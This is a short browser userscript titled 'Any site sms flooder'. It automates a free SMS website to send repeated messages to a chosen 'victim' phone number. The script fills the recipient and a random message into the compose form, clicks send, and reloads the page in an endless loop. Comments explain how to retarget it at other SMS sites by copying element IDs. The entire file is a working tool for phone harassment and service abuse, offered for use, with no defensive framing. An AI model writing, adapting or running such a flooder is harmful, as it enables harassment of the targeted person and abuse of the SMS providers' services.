// ==UserScript==
// @name          Any site sms flooder
// @namespace     Yash
// @description   flooder sms
// @include       http://*160by2.com/*
//                ^^ Replace this with the site using which u want to flood eg http://*way2sms.com/*
// ==/UserScript==

var victim=0; //Enter victims number here
var delay=0; // Enter delay in milliseconds if required
var initialPage='http://160by2.com/compose_sms.aspx'; //Enter url of compose message page in the site
var finalPage='http://160by2.com/postview_latest.aspx';  //Enter url of confirmation page in the site.
var mobilenoid='txt_mobileno'; // Id of the text box where u put mobile no.
var messageid='txt_msg'; //Id of the text box where u type the message
var submitid='btnsendsms'; // Id of the submit(or send sms) button

//To get id, right click on the textbox or submit button and click on inspect elemet. and copy the id part of the highlighted portion. (using chrome) 

if(document.location==initialPage)
{
document.getElementById(mobilenoid).value=victim;
document.getElementById(messageid).value=Math.floor(Math.random()*1456484)+'Yehlo krlo flood!!'+Math.floor(Math.random()*1456484);
void(0);
document.getElementById(submitid).click();
}

if(document.location==finalPage)
{
setTimeout('document.location=initialPage',delay);
}